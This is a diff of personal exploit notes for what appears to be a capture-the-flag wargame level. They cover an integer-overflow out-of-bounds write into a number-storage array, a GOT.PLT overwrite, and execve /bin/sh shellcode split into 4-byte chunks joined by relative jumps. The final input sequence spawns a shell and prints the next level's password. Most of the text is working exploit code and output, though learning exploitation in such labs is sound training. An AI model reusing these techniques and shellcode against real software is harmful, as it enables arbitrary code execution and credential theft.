@@ -48,68 +48,166 @@ start buffer:	0xffffd574
 /*	S T R A T E G Y      */
 /*****************************/
 
-Strategy -> overwrite value with store on specific index 
-find where index superior at 100 write
-
--> Possible to write with negatif indexes  
+-> Possible to write in the stack and sections by negative index or utin overflow
 
 
-Partial RELRO protect on
+F A I L :
+- cannot overwrite ret addr of main (index 114)
+can overwrite ebp 113 but not ret addr 114
+- cannot overwrite ret addr of store_number (-11) 
+same like probleme like index ret addr main
+=> mainly because of % 3
 
 
-- Try to overwrite ret addr of store_number / read_number
-1. find ret addr (ebp + 4)
+New Strategy
 
-(gdb) x $ebp + 4
-0xffffd54c:	0x080488ef
-
-2. Try to overwrite eip => F A I L  
--> can overwrite ebp but not eip index with -11
-
-3. Try to overwrite something else, ex: %u -> F A I L 
-0xffffd4f0:	0x08048ad0 <- point to "%u"
--> because %u is in rodata section 
-
-4. GOT.PLT 
-create payload in buffer (stack) and overwrite printf plt
- 
-start buffer:	0xffffd574
-
-print.got.plt: 0x804a000
-
-0x804a000 <printf@got.plt>:	0xf7e78480
-
-0xffffd574 - 0x0804a000 = F7FB3574 (4160435572)
-
--4294967295
--4260435572
--4261435572
--4261335571 <- 0x8048d24
--4261334571 <- 0x8048d24
--4261333571 <- 0x8048d24
--4261333339 <- 0x8048d24
-
-
--4261333349 <- 0x804afe0
-
-
--4261333390
-
--4261334364 -> 0x804a004 <fflush@got.plt>
--4261334363 -> 0x804a008 <getchar@got.plt>
-
--> Works correctly 
-with store:
-	number: 55
-	index: -4261334363 
+-> Try to overwrite got.plt entry -> Possible because it has more than 3 addr (counter % 3)
+store:
+        number: 55
+        index: 33632933 in gdb (!!! 33632936 in vm !!!)
 Program received signal SIGSEGV, Segmentation fault.
 0x00000037 in ?? ()
+-> IT WORKS 
+
+-> Try to redirect in a sigtrap in the buffer (buffer[0] = \xCC)
+-> Found buffer[1] = 0xffffd578 (4294956408) in gdb (0xFFFFD568 in vm)
+store:
+	number:	3435973836 (\xcc\xcc\xcc\xcc)
+	index: 	1
+
+store:
+	number: 4294956408 (addr buffer[1])
+	index:  33632933 (overflow uint to got.plt entries)
+
+
+-> Create payload:
+Contraints 2 * 4 bytes consecutives maximum because of modulo 3, 
+then we need to add relative jump to our payload
+\xEB\x04 jmp 4 bytes
+
+Exemple:
+0xffffd56c:	0xffffd7d8	0x00000000	0x00000000	0x90909090
+0xffffd57c:	0x04eb9090	0x00000000	0xcccccccc	0x00000000
+
+
+0:  31 c0                   xor    eax,eax
+2:  50                      push   eax
+3:  68 2f 2f 73 68          push   0x68732f2f
+8:  68 2f 62 69 6e          push   0x6e69622f
+d:  89 e3                   mov    ebx,esp
+f:  89 c1                   mov    ecx,eax
+11: 89 c2                   mov    edx,eax
+13: b0 0b                   mov    al,0xb
+15: cd 80                   int    0x80
+17: 31 c0                   xor    eax,eax
+19: 40                      inc    eax
+1a: cd 80                   int    0x80
+
+Little endian shell code + jumps
+
+\x90\x90\x90\x90  \x04\xeb\x90\x90
+2425393296	  82546832
+
+\x31\xc0\x50\x90 \x90\x90\xEB\x04
+9050c031	 04eb9090
+2421211185	 82546832
+    1		     2
+
+\x68\x2f\x2f\x73 \x68\x90\xEB\x04
+732f2f68	 04eb9068
+1932472168	 82546792
+    4		     5
+
+\x68\x2f\x62\x69 \x6e\x90\xEB\x04
+69622f68	 04eb906e
+1768042344	 82546798 
+    7		     8
+
+\x89\xe3\x89\xc1 \x89\xc2\xEB\x04
+c189e389	 04ebc289
+3247039369	 82559625
+    10		    11
+
+\xb0\x0b\xcd\x80 \x31\xc0\xEB\x04
+80cd0bb0	 04ebc031
+2160921520	 82559025
+    13		    14
+
+\x40\xcd\x80
+80cd40
+8441152
+   16
+
+/*******************************************************************/
+		F I N A L
+
+Input command: store
+ Number: 3435973836
+ Index: 1
+ Completed store command successfully
+Input command: store
+ Number: 4294956392
+ Index: 33632936
+ Completed store command successfully
+Input command: store
+Trace/breakpoint trap (core dumped)
 
 
 
-5. return addr main -> F A I L  
-can overwrite ebp 113 but not ret addr 114
+Input command: store
+ Number: 2421211185
+ Index: 1
+ Completed store command successfully
+Input command: store
+ Number: 82546832
+ Index: 2
+ Completed store command successfully
+Input command: store
+ Number: 1932472168
+ Index: 4
+ Completed store command successfully
+Input command: store
+ Number: 82546792
+ Index: 5
+ Completed store command successfully
+Input command: store
+ Number: 1768042344
+ Index: 7
+ Completed store command successfully
+Input command: store
+ Number: 82546798
+ Index: 8
+ Completed store command successfully
+Input command: store
+ Number: 3247039369
+ Index: 10
+ Completed store command successfully
+Input command: store
+ Number: 82559625
+ Index: 11
+ Completed store command successfully
+Input command: store
+ Number: 2160921520
+ Index: 13
+ Completed store command successfully
+Input command: store
+ Number: 82559025
+ Index: 14
+ Completed store command successfully
+Input command: store
+ Number: 8441152
+ Index: 16
+ Completed store command successfully
+Input command: store
+ Number: 4294956392
+ Index: 33632936
+ Completed store command successfully
+Input command: store
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+$ 
 
+/*******************************************************************/
 
-- Overwrite got.plt -> partial RELRO protect only the .got
-- overwrite other value with index/number  
